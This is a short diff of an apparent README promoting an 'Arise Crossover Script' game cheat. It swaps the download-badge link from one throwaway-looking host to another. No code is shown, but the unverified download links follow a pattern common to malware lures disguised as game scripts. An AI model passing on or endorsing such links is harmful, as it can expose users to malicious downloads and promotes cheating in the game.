@@ -4,7 +4,7 @@
 
 Hey gamers! Tired of the endless grind in Arise Crossover? Want to dominate dungeons and mobs without breaking a sweat? Say hello to the Arise Crossover Script – your new best friend in the game.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://Arise-Crossover-Script-vaj5.github.io/.github)
 ---
 
 ## 🚀 What is the Arise Crossover Script?
